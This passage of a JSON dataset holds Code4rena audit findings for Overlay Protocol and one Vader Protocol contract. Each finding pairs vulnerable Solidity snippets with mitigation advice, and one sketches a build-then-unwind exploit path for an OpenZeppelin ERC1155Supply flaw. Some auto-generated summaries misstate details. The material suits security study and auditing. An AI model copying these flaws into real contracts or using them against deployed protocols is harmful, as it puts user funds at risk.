      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe `OverlayV1UniswapV3Market.fetchPricePoint` tries to compute the market depth in OVL terms as `marketLiquidity (in ETH) / ovlPrice (in ETH per OVL)`.\nTo get the market liquidity *in ETH* (and not the other token pair), it uses the `ethIs0` boolean.\n\n```solidity\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\nHowever, `ethIs0` boolean refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and therefore the `ethIs0` boolean has nothing to do with the *market* feed where the liquidity is taken from:\n\n```solidity\n// in constructor, if token0 is eth refers to ovlFeed\nethIs0 = IUniswapV3Pool(_ovlFeed).token0() == _eth;\n\n// in fetchPricePoint, _liquidity comes from different market feed\n( _ticks, _liqs ) = IUniswapV3Pool(marketFeed).observe(_secondsAgo);\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\n#### Impact\n\nIf the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted).\nFor example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\n#### Recommended Mitigation Steps\n\nIt seems that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.\n\n**[realisation (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/83#issuecomment-985656027):**\n > Yeah, was aware of this, just hadn't finalized it in the code as of yet. \n\n\n\n",
      "summary": "\nThe report highlights a bug in the `OverlayV1UniswapV3Market.fetchPricePoint` function, which is used to compute market depth in OVL terms. The function uses a boolean called `ethIs0` to determine the market liquidity in ETH, but this boolean only refers to the `ovlFeed` and not the `marketFeed` where the liquidity is taken from. This can result in incorrect market depth and market cap calculations if the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair. The recommended solution is to use `marketFeed.token0() == WETH` instead of `ovlFeed.token0() == WETH` in the `fetchPricePoint` function. This issue has been confirmed and is being worked on by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/83",
      "tags": [],
      "finders": []
    },
    {
      "id": "1072",
      "title": "[M-09] Improper Upper Bound Definition on the Fee",
      "impact": "MEDIUM",
      "content": "_Submitted by defsec, also found by gzeon, nathaniel, WatchPug, cmichel,  and pauliax_\n\n#### Impact\n\nIn the `adjustGlobalParams` function on line 1603 of \"<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L1630>\", `adjustGlobalParams` function does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions.\n\n#### Proof of Concept\n\n*   The `setFee` function that begins on line 163 of `adjustGlobalParams` sets the liquidity and transaction fee rates for the market in which the function is called. In this context, the transaction fee is the percentage of a transaction that is taken by the protocol and moved to a designated reserve account. As the name suggests, transaction fees factor in to many of the essential transaction types performed within the system.\n*   Navigate to \"<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L163>\" contract and go to line #163.\n*   On the function there is no upper and lower bound defined. Therefore, users can pay higher fees.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nConsider defining upper and lower bounds on the `adjustGlobalParams` function.\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/77)** \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/77#issuecomment-997195772):**\n > Several wardens have marked this issue as high severity due to the potential for governance to rug users. Several have marked it as low risk because it's really just a bounding issue and presumably governance would not willingly choose to rug their users. \n> \n> I view this a medium severity issue. If exploited, the impact would be high. The likelihood that it would be exploited intentionally or happen unintentionally is low, but not impossible as the uninformed users dynamic could come into play here.\n\n",
      "summary": "\nThis bug report outlines a vulnerability in the adjustGlobalParams function on line 1630 of the OverlayV1Mothership.sol contract. This function is used to set the liquidity and transaction fee rates for the market, and it does not have any upper or lower bounds. This means that users can pay higher fees than necessary, which can lead to reversions in several critical functions. To mitigate this vulnerability, it is recommended to define upper and lower bounds on the adjustGlobalParams function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/77",
      "tags": [],
      "finders": [
        "pauliax",
        "cmichel",
        "gzeon",
        "WatchPug",
        "nathaniel",
        "defsec"
      ]
    },
    {
      "id": "1071",
      "title": "[M-08] OverlayToken.burn function could burn tokens of any user",
      "impact": "MEDIUM",
      "content": "_Submitted by xYrYuYx_\n\n#### Impact\n\n<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/ovl/OverlayToken.sol#L366>\n\nThe burner could burn any amount of tokens of any user.\nThis is not good solution of burn\n\n#### Tools Used\n\nManual\n\n#### Recommended Mitigation Steps\n\nUpdate burn function for only owner can burn his tokens.\nNow, `ovl.burn` function is used in OverlayV1OVLCollateral.sol file, and these updates won’t make any issue in protocol.\n\n**[mikeyrf (Overlay) acknowledged](https://github.com/code-423n4/2021-11-overlay-findings/issues/22#issuecomment-988249666):**\n > sponsor acknowledged reason - `onlyBurner` modifier with access control privileges prevent unexpected burn amounts, given only collateral managers are given burn permissions\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the OverlayToken.sol file of the 2021-11-overlay repository. It was discovered manually, and the impact of the vulnerability is that the burner could burn any amount of tokens of any user. This is not a good solution for burning tokens. The recommended mitigation step is to update the burn function so that only the owner can burn their tokens. This update should not affect the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/22",
      "tags": [],
      "finders": [
        "xYrYuYx"
      ]
    },
    {
      "id": "1070",
      "title": "[M-07] Cached version of ovl may be outdated",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\n#### Impact\n\ncontract OverlayV1OVLCollateral and OverlayV1Governance cache ovl address:\n\n```solidity\nIOverlayTokenNew immutable public ovl;\n```\n\nThis variable is initialized in the constructor and fetched from the mothership contract:\n\n```solidity\nmothership = IOverlayV1Mothership(_mothership);\novl = IOverlayV1Mothership(_mothership).ovl();\n```\n\novl is declared as immutable and later contract interacts with this cached version. However, mothership contains a setter function, so the governor can point it to a new address:\n\n```solidity\nfunction setOVL (address _ovl) external onlyGovernor {\n    ovl = _ovl;\n}\n```\n\n`OverlayV1OVLCollateral` and `OverlayV1Governance` will still use this old cached value.\n\n#### Recommended Mitigation Steps\n\nConsider if this was intended, or you want to remove this cached version and always fetch on the go (this will increase the gas costs though).\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-978085480):**\n > This is just a detail we were yet to settle on but definitely were going to as we got the contracts to a totally deployable state.\n\n**[mikeyrf (Overlay) disagreed with severity](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-989289973):**\n > disagree w severity reason - would put this at 1 - Low Risk given the governor would be responsible for properly setting\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/129#issuecomment-998216930):**\n > I agree with the warden that this constitutes a medium risk.\n> \n> From the judging criteria (emphasis mine):\n> > 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when **assets are not at direct risk, but the function of the protocol or its availability could be impacted**, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\n\n\n",
      "summary": "\nThis bug report concerns two contracts, OverlayV1OVLCollateral and OverlayV1Governance, that cache an address of a token, ovl, that is declared as immutable. This address is initialized in the constructor and fetched from the mothership contract. However, the mothership contract contains a setter function that allows the governor to point the address to a new address. This means that the two contracts will still use the old cached value. To fix this issue, the developer must consider if this was intended, or if the cached version should be removed and the address should be fetched on the go. This will increase the gas costs, however.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/129",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1069",
      "title": "[M-06] Timelock and events for governor functions",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\n#### Impact\n\nThere are contracts that contain functions that change important parameters of the system, e.g. `OverlayV1Mothership` has `setOVL`, `initializeMarket`, `disableMarket`, `enableMarket`, `initializeCollateral`, `enableCollateral`, `disableCollateral`, `adjustGlobalParams`. None of these functions emit events, nor they are timelocked. Usually, it is a good practice to give time for users to react and adjust to changes.\n\nA similar issue was submitted in a previous contest and assigned a severity of Medium: <https://github.com/code-423n4/2021-09-swivel-findings/issues/101>\n\n#### Recommended Mitigation Steps\n\nConsider using a timelock for critical params of the system and emitting events to inform the outside world.\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-978096272):**\n > The plan has been to have a timelock at some point in the protocol. Probably on whatever is the admin for the mothership. But this just had to be evaluated. It might be on the market contract itself, or on the addresses granted the role of admin.\n\n**[mikeyrf (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-987979184):**\n > duplicate #64 \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/120#issuecomment-997204779):**\n > I'm removing the duplicate in this case because issue #64 refers exclusively to the events. This issue is focused primarily on the lack of governance timelock, which has traditionally been considered a medium severity issue.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in contracts that contain functions that change important parameters of the system. These functions do not emit events, nor are they timelocked, which means that users do not have time to adjust to changes. This vulnerability was previously assigned a severity of Medium. The recommended mitigation steps are to use a timelock for critical params of the system and to emit events to inform the outside world. This will give users time to adjust to changes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/120",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1068",
      "title": "[M-05] Fee double counting for underwater positions",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n#### Impact\n\nActual available fees are less than recorded. That's because a part of them corresponds to underwater positions, and will not have the correct amount stored with the contract: when calculation happens the fee is recorded first, then there is a check for position health, and the funds are channeled to cover the debt firsthand. This way in a case of unfunded position the fee is recorded, but cannot be allocated, so the fees accounted can be greater than the value of fees stored.\n\nThis can lead to fee withdrawal malfunction, i.e. `disburse()` will burn more and attempt to transfer more than needed. This leads either to inability to withdraw fees when disburse is failing due to lack of funds, or funds leakage to fees and then inability to perform other withdrawals because of lack of funds.\n\n#### Proof of Concept\n\nThe fees are accounted for before position health check and aren't corrected thereafter when there is a shortage of funds.\n\n<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/collateral/OverlayV1OVLCollateral.sol#L311>\n\n#### Recommended Mitigation Steps\n\nAdjust fees after position health check: accrue fees only on a remaining part of position that is available after taking debt into account.\n\nNow:\n```solidity\nuint _feeAmount = _userNotional.mulUp(mothership.fee());\n\nuint _userValueAdjusted = _userNotional - _feeAmount;\nif (_userValueAdjusted > _userDebt) _userValueAdjusted -= _userDebt;\nelse _userValueAdjusted = 0;\n```\nTo be:\n```solidity\nuint _feeAmount = _userNotional.mulUp(mothership.fee());\n\nuint _userValueAdjusted = _userNotional - _feeAmount;\nif (_userValueAdjusted > _userDebt) {\n    _userValueAdjusted -= _userDebt;\n} else {\n    _userValueAdjusted = 0;\n    _feeAmount = _userNotional > _userDebt ? _userNotional - _userDebt : 0;\n}\n```\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/134)**\n\n",
      "summary": "\nThis bug report is about the vulnerability of fees being recorded before position health check in OverlayV1OVLCollateral.sol. This can lead to fee withdrawal malfunction, i.e. disburse() will burn more and attempt to transfer more than needed. This can result in either inability to withdraw fees when disburse fails due to lack of funds, or funds leakage to fees and then inability to perform other withdrawals due to lack of funds. The recommended mitigation step is to adjust the fees after position health check. This can be done by accruing fees only on the remaining part of the position that is available after taking debt into account. The code should be adjusted from the current code to the suggested code provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/134",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1067",
      "title": "[M-04] _totalSupply not updated in _transferMint() and _transferBurn() ",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe functions _transferMint() and _transferBurn() of OverlayToken.sol don't update _totalSupply.\nWhereas the similar functions _mint() and _burn() do update _totalSupply.\n\nThis means that _totalSupply and totalSupply() will not show a realistic view of the total OVL tokens.\n\nFor the protocol itself it isn't such a problem because this value isn't used in the protocol (as far as I can see).\nBut other protocols building on Overlay may use it, as well as user interfaces and analytic platforms.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L349-L364\n```JS\nfunction _mint( address account, uint256 amount) internal virtual {\n   ...\n      _totalSupply += amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L376-L395\n```JS\nfunction _burn(address account, uint256 amount) internal virtual {\n   ...\n        _totalSupply -= amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L194-L212\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L268-L286\n\n## Tools Used\n\n## Recommended Mitigation Steps\nUpdate _totalSupply  in _transferMint() and _transferBurn()",
      "summary": "\nA bug has been reported in the OverlayToken.sol contract. The functions _transferMint() and _transferBurn() do not update the _totalSupply variable, while the similar functions _mint() and _burn() do update the _totalSupply variable. This means that the _totalSupply and totalSupply() will not show a realistic view of the total OVL tokens, which could be used by other protocols, user interfaces, and analytic platforms. The bug can be found in the following sections of the contract: _mint() and _burn() (lines 349-364 and 376-395 respectively) and _transferMint() and _transferBurn() (lines 194-212 and 268-286 respectively). The recommended mitigation step is to update _totalSupply in _transferMint() and _transferBurn().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/59",
      "tags": [],
      "finders": [
        "harleythedog",
        "gpersoon",
        "cmichel",
        "xYrYuYx",
        "WatchPug",
        "hubble",
        "defsec"
      ]
    },
    {
      "id": "1066",
      "title": "[M-03] Can’t enableCollateral after a disableCollateral ",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function disableCollateral of OverlayV1Mothership.sol doesn't set collateralActive[_collateral] = false;\nBut it does revoke the roles.\n\nNow enableCollateral  can never be used because collateralActive[_collateral] ==true  and it will never pass the second require.\nSo you can never grant the roles again.\n\nNote: enableCollateral also doesn't set collateralActive[_collateral] = true\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/mothership/OverlayV1Mothership.sol#L133-L153\n\n```JS\n function enableCollateral (address _collateral) external onlyGovernor {\n        require(collateralExists[_collateral], \"OVLV1:!exists\");\n        require(!collateralActive[_collateral], \"OVLV1:!disabled\");\n        OverlayToken(ovl).grantRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n        OverlayToken(ovl).grantRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n    }\n\n    function disableCollateral (address _collateral) external onlyGovernor {\n        require(collateralActive[_collateral], \"OVLV1:!enabled\");\n        OverlayToken(ovl).revokeRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n        OverlayToken(ovl).revokeRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n    }\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nIn function enableCollateral() add the following (after the require):\ncollateralActive[_collateral] = true;\n\nIn function disableCollateral add the following (after the require):\ncollateralActive[_collateral] = false;",
      "summary": "\nA bug has been reported by gpersoon in the OverlayV1Mothership.sol code. The function disableCollateral does not set collateralActive[_collateral] to false, but it does revoke the roles. This means that enableCollateral can never be used again, as collateralActive[_collateral] is still true and it will never pass the second require. Additionally, enableCollateral does not set collateralActive[_collateral] to true.\n\nThe recommended mitigation steps are to add collateralActive[_collateral] = true; to the function enableCollateral(), and collateralActive[_collateral] = false; to the function disableCollateral(). This will ensure that the roles are revoked and can be granted again, as collateralActive[_collateral] will be set to the correct value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/55",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "1065",
      "title": "[M-02] pow() is missing check on input parameters with 0 value",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nThe contract LogExpMath.sol seems to be a fork of the balancer LogExpMath.sol contract.\nIt is mostly similar, except for checks for x and y being 0 in the beginning of the function `pow()`, see below.\n\nThis omission might lead to unexpected results.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/libraries/LogExpMath.sol#L93-L110>\n\n```JS\n function pow(uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n        _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);\n```\n\n<https://github.com/balancer-labs/balancer-v2-monorepo/blob/master/pkg/solidity-utils/contracts/math/LogExpMath.sol#L93-L109>\n\n```JS\nfunction pow(uint256 x, uint256 y) internal pure returns (uint256) {\n    if (y == 0) {\n        // We solve the 0^0 indetermination by making it equal one.\n        return uint256(ONE_18);\n    }\n\n    if (x == 0) {\n        return 0;\n    }      \n    _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);\n```\n\n#### Recommended Mitigation Steps\n\nCheck if the extra code of the balance contract is useful and if so add it.\n\n**[realisation (Overlay) disputed](https://github.com/code-423n4/2021-11-overlay-findings/issues/54#issuecomment-988278760):**\n > Out of scope\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/54#issuecomment-997201531):**\n > I disagree with sponsor regarding scope. The [Contracts section of the Contest Scope](https://github.com/code-423n4/2021-11-overlay/tree/914bed22f190ebe7088194453bab08c424c3f70c#contracts) lists several contracts which rely on `contracts/libraries/FixedPoint.sol`. This contract uses the `pow` function containing the issue described. The warden has not described an exact attack but has show a math issue, which can certainly lead to a hypothetical loss of funds. Medium severity is appropriate and sponsor should definitely fix this.\n\n\n\n",
      "summary": "\nA bug has been identified in the contract LogExpMath.sol. This contract seems to be a fork of the balancer LogExpMath.sol contract, but it is missing some checks for x and y being 0 in the beginning of the function pow(). This omission could lead to unexpected results. The code snippets from both contracts can be found in the Proof of Concept section of the report. It is recommended that the extra code of the balance contract is added if it is useful.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/54",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "1064",
      "title": "[M-01] isUnderwater returns opposite boolean for short positions",
      "impact": "MEDIUM",
      "content": "_Submitted by harleythedog_\n\n#### Impact\n\nThe function `isUnderwater` should return true if the position value is < 0. In the case of a short position, this is when oi \\* (2 - priceFrame) - debt < 0 (based on the logic given in the \\_value function). Rearranging this equation, a short position is underwater if oi \\* 2 < oi \\* priceFrame + debt. However, in the function `\\_isUnderwater` in Position.sol, the left and right side of this equation is flipped, meaning that the function will return the opposite of what it should when called on short positions.\n\nFortunately, the V1 implementation of `OverlayOVLCollateral` does not directly use the `isUnderwater` function in major control flow changes. However, line 304 of OverlayV1OVLCollateral.sol is a comment that says:\n\n// TODO: think through edge case of underwater position ... and fee adjustments ...\n\nwhich hints that this function is going to be used to deal with underwater positions. As a result, this issue would have a huge impact if not properly dealt with.\n\n#### Proof of Concept\n\nSee code for `\\_isUnderwater` here: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/libraries/Position.sol#L70>\n\nNotice that for short positions the inequality is flipped from what it should be (indeed, when self.debt is higher it is more likely that `isUnder` will be false, which is obviously incorrect).\n\nAlso, see the TODO comment here that shows `isUnderwater` is important: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/collateral/OverlayV1OVLCollateral.sol#L304>\n\n#### Tools Used\n\nInspection\n\n#### Recommended Mitigation Steps\n\nFlip the left and right side of the inequality for short positions in `\\_isUnderwater`.\n\n**[mikeyrf (Overlay) disagreed with severity](https://github.com/code-423n4/2021-11-overlay-findings/issues/53#issuecomment-988281184):**\n > disagree with severity - `isUnderwater()` isn't used anywhere in the collateral manager and markets. Is more for information purposes, so would rate this at a severity of 2 - Medium in the event we had actually used this function for something more important\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/53#issuecomment-997196446):**\n > I agree with the sponsor here. This represents a severe, but hypothetical issue.\n\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in the function _isUnderwater in Position.sol which is used to determine if a position is underwater. The function should return true if the position value is less than 0, however, for short positions, the left and right side of the equation are flipped, meaning the function will return the opposite of what it should. This could have a huge impact if not dealt with properly. The bug was found through inspection, and the recommended mitigation step is to flip the left and right side of the inequality for short positions in _isUnderwater.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/53",
      "tags": [],
      "finders": [
        "harleythedog"
      ]
    },
    {
      "id": "1063",
      "title": "[H-02] OZ ERC1155Supply vulnerability",
      "impact": "HIGH",
      "content": "_Submitted by pauliax, also found by hubble and defsec_\n\n#### Impact\n\nOverlay uses OZ contracts version 4.3.2:\n\n```yaml\n  dependencies:\n    - OpenZeppelin/openzeppelin-contracts@4.3.2\n```\n\nand has a contract that inherits from ERC1155Supply:\n\n```solidity\n  contract OverlayV1OVLCollateral is ERC1155Supply\n```\n\nThis version has a recently discovered vulnerability:\n<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wmpv-c2jp-j2xg>\n\nIn your case, function unwind relies on totalSupply when calculating `\\_userNotional`, `\\_userDebt`, `\\_userCost`, and `\\_userOi`, so a malicious actor can exploit this vulnerability by first calling 'build' and then on callback 'unwind' in the same transaction before the total supply is updated.\n\n#### Recommended Mitigation Steps\n\nConsider updating to a patched version of 4.3.3.\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/127)**\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Overlay contracts version 4.3.2, which is used in the application. The vulnerability is related to the ERC1155Supply contract, and it can be exploited by a malicious actor by first calling the 'build' and then 'unwind' functions in the same transaction before the total supply is updated. The recommended mitigation step is to update to a patched version of 4.3.3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/127",
      "tags": [
        "ERC1155"
      ],
      "finders": [
        "hubble  defsec",
        "pauliax"
      ]
    },
    {
      "id": "1062",
      "title": "[H-01] OverlayV1UniswapV3Market computes wrong market liquidity",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `OverlayV1UniswapV3Market.fetchPricePoint` tries to compute the market depth in OVL terms as `marketLiquidity (in ETH) / ovlPrice (in ETH per OVL)`.\nTo get the market liquidity _in ETH_ (and not the other token pair), it uses the `ethIs0` boolean.\n\n```solidity\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\nHowever, `ethIs0` boolean refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and therefore the `ethIs0` boolean has nothing to do with the _market_ feed where the liquidity is taken from:\n\n```solidity\n// in constructor, if token0 is eth refers to ovlFeed\nethIs0 = IUniswapV3Pool(_ovlFeed).token0() == _eth;\n\n// in fetchPricePoint, _liquidity comes from different market feed\n( _ticks, _liqs ) = IUniswapV3Pool(marketFeed).observe(_secondsAgo);\n_marketLiquidity = ethIs0\n    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice\n    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);\n```\n\n## Impact\nIf the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted).\nFor example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\n## Recommended Mitigation Steps\nIt seems that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.",
      "summary": "\nThis bug report is about the `OverlayV1UniswapV3Market.fetchPricePoint` function, which tries to compute the market depth in OVL terms. The code uses the `ethIs0` boolean to get the market liquidity _in ETH_ (and not the other token pair), however, `ethIs0` refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and thus the boolean has nothing to do with the _market_ feed where the liquidity is taken from.\n\nThe impact of this bug is that if the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted). For example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.\n\nThe recommended mitigation step is that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/83",
      "tags": [
        "Business Logic",
        "Wrong Math"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "42355",
      "title": "[M-23] Users Can Reset Bond Depositor's Vesting Period",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `VaderBond.deposit()` function overwrites a depositors bond info on each call with the updated `payout` information. If any of the vesting is left unclaimed before a call to `deposit()` is made, the vesting period is reset to `terms.vestingTerm`, resulting in the bond holder having to wait again in order to claim tokens that they could previously claim.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/repo/vader-bond/contracts/VaderBond.sol#L192>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nConsider preventing users from depositing to an existing bond holder or alternatively when a deposit is made, force the user to redeem any claimable tokens in the same function.\n\n**[0xstormtrooper (Vader) acknowledged](https://github.com/code-423n4/2021-11-vader-findings/issues/259#issuecomment-969871819):**\n > Users will be warned that depositing resets the vesting term.\n> This will also be documented on the contract.\n\n",
      "summary": "\nThe bug report is about an issue with the `VaderBond.deposit()` function. It is reported that when this function is called, it overwrites the bond information of the depositor with updated payout information. This means that if a depositor has any unclaimed tokens, they will have to wait again to claim them because the vesting period is reset to the original term. The bug was found through a manual code review and it is recommended to prevent users from depositing to an existing bond holder or to force them to redeem any claimable tokens in the same function. The team has acknowledged the issue and will warn users about the reset of the vesting term when depositing. This will also be documented in the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/259",
      "tags": [],
      "finders": []
    },
    {
      "id": "42354",
      "title": "[M-19] Unclear `TwapOracle.consult` algorithm",
      "impact": "MEDIUM",
